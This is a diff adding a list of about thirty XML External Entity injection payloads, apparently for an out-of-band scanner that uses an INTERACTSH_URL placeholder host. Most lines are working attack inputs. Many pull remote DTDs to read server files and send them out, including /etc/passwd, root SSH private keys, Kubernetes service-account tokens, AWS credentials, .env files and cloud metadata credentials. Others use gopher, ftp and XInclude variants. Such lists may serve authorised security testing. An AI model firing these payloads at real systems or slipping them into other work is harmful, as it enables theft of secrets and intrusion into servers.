@@ -1,0 +1,31 @@
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/">%xxe;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://INTERACTSH_URL/evil.dtd">%remote;%intern;%exfil;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % remote SYSTEM "http://INTERACTSH_URL/evil.dtd">%remote;]><foo/>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://INTERACTSH_URL/?data=%file;'>">
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://INTERACTSH_URL/xxe.xml">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://INTERACTSH_URL/evil.dtd"><data/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % intern "<!ENTITY &#37; exfil SYSTEM 'http://INTERACTSH_URL/?data=%data;'>">%intern;%exfil;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/evil.dtd">%dtd;]><foo>&all;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % blind SYSTEM "http://INTERACTSH_URL/blind-xxe">%blind;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % asd SYSTEM "http://INTERACTSH_URL/evil.dtd">%asd;%c;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % d "<!ENTITY exfil SYSTEM 'http://INTERACTSH_URL/?x=%f;'>">%d;]><foo>&exfil;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///proc/self/cmdline"><!ENTITY % e "<!ENTITY &#37; s SYSTEM 'http://INTERACTSH_URL/?c=%f;'>">%e;%s;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "http://INTERACTSH_URL/a.dtd">%a;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/blind"><!ENTITY &#37; xxe SYSTEM 'http://INTERACTSH_URL/trigger'>%xxe;]><foo/>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://INTERACTSH_URL/">%remote;]><root/>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 SYSTEM "http://INTERACTSH_URL/p1.dtd">%p1;]><r/>
+<?xml version="1.0"?><!DOCTYPE bar [<!ENTITY xxe SYSTEM "http://INTERACTSH_URL/test">]><bar>&xxe;</bar>
+<?xml version="1.0"?><!DOCTYPE b [<!ENTITY % c SYSTEM "http://INTERACTSH_URL/c"><!ENTITY % d "<!ENTITY e SYSTEM 'http://INTERACTSH_URL/?e=%c;'>">%d;%e;]><b/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % env SYSTEM "file:///proc/self/environ"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/e.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % tok SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/k.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % key SYSTEM "file:///root/.ssh/id_rsa"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/r.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % env SYSTEM "file:///app/.env"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/env.dtd">%dtd;]><foo/>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://INTERACTSH_URL/xi"/></foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % x SYSTEM "http://INTERACTSH_URL/x">%x;]><foo xmlns="http://INTERACTSH_URL/ns"/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "https://INTERACTSH_URL/evil.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://INTERACTSH_URL:8080/evil.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % s SYSTEM "gopher://INTERACTSH_URL:9999/">%s;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % d SYSTEM "ftp://INTERACTSH_URL/d">%d;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///etc/aws/credentials"><!ENTITY % r SYSTEM "http://INTERACTSH_URL/aws.dtd">%r;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % cfg SYSTEM "file:///app/config.yaml"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/cfg.dtd">%dtd;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/meta.dtd">%dtd;]><foo/>
